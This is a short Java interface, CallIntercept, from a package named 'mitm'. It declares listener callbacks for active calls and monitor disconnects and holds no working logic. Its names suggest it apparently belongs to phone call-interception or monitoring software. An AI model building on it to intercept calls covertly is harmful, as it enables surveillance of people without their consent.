package com.vvt.callmanager.mitm;

import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.MonitorDisconnectData;

public interface CallIntercept {
	
	public void setInterceptListener(Listener listener);
	public void resetInterceptListener();

	public interface Listener {
		public void onNormalCallActive(ActiveCallInfo callInfo);
		public void onMonitorDisconnect(MonitorDisconnectData reason);
	}
}
